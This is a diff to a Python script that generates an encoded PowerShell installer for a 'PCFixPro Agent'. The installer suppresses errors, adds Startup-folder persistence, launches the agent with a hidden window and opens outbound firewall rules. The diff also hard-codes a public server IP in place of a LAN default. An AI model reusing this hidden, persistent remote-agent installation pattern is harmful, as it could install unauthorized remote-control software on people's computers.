@@ -22,21 +22,21 @@ def create_embedded_installer(server_ip=None):
         agent_lines.append(line)
     
     # Build PowerShell script
-    ps_script = '''
-param($ServerIP = "SERVERIPPLACEHOLDER")
+    server_ip_final = server_ip or '102.209.236.22'
+    ps_script = f'''
+param($ServerIP = "{server_ip_final}")
 
 $ErrorActionPreference = "SilentlyContinue"
 $InstallDir = "$env:ProgramFiles\\PCFixPro Agent"
 
-if (-not (Test-Path $InstallDir)) {
+if (-not (Test-Path $InstallDir)) {{
     New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
-}
+}}
 
 $ClientIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.InterfaceAlias -ne "Loopback" }}).IPAddress
 if (-not $ClientIP) {{ $ClientIP = "unknown" }}
 
 '''
-    ps_script = ps_script.replace('SERVERIPPLACEHOLDER', server_ip or '192.168.100.253')
     
     # Add agent.py content as heredoc
     ps_script += '@"\n'
@@ -45,25 +45,26 @@ if (-not $ClientIP) {{ $ClientIP = "unknown" }}
         ps_script += escaped + '\n'
     ps_script += '"@ | Out-File -FilePath "$InstallDir\\agent.py" -Encoding UTF8\n\n'
     
-    ps_script += '''
+    ps_script += f'''
 # Write config
-$Config = '{"server_url":"http://'+server_ip+'"}'| ConvertTo-Json
+$Config = '{{"server_url":"http://{server_ip_final}:5000"}}' | ConvertTo-Json
 $Config | Out-File -FilePath "$InstallDir\\config.json" -Encoding UTF8
 
 # Install dependencies
 pip install python-socketio requests pywin32 --quiet 2>$null
 
 # Create startup
-"import os; os.chdir(r'$InstallDir'); exec(open(r'$InstallDir\\agent.py').read())" > "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pcfixpro_agent.py"
+"import os; os.chdir(r'$InstallDir'); exec(open(r'$InstallDir\\\\agent.py').read())" > "$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\pcfixpro_agent.py"
 
 # Start hidden
-Start-Process pythonw -ArgumentList "`"$InstallDir\\agent.py`"" -WindowStyle Hidden
+Start-Process pythonw -ArgumentList "`"$InstallDir\\\\agent.py`"" -WindowStyle Hidden
 
 # Firewall
-netsh advfirewall firewall add rule name="PCFixPro Agent" dir=in action=allow program="pythonw.exe" enable=yes 2>$null
+netsh advfirewall firewall add rule name="PCFixPro Agent" dir=out action=allow program="python.exe" enable=yes 2>$null
+netsh advfirewall firewall add rule name="PCFixPro Agent" dir=out action=allow program="pythonw.exe" enable=yes 2>$null
 
 # Status file
-"PCFixPro Agent Installed`nServer: http://''' + (server_ip or '192.168.100.253') + ''':5000`nClient IP: $ClientIP`nHostname: $env:COMPUTERNAME" > "$env:USERPROFILE\\Desktop\\PCFixPro_Status.txt"
+"PCFixPro Agent Installed`nServer: http://{server_ip_final}:5000`nClient IP: $ClientIP`nHostname: $env:COMPUTERNAME" > "$env:USERPROFILE\\\\Desktop\\\\PCFixPro_Status.txt"
 '''
 
     # Encode to base64
@@ -92,11 +93,11 @@ pause
     
     installer_path.write_text(batch_content)
     print(f"[OK] Created: {installer_path}")
-    print(f"[INFO] Server IP: {server_ip or '192.168.100.253'}")
+    print(f"[INFO] Server IP: {server_ip_final}")
 
 if __name__ == "__main__":
     import argparse
     parser = argparse.ArgumentParser()
-    parser.add_argument('--server-ip', default='192.168.100.253')
+    parser.add_argument('--server-ip', default='102.209.236.22')
     args = parser.parse_args()
     create_embedded_installer(args.server_ip)
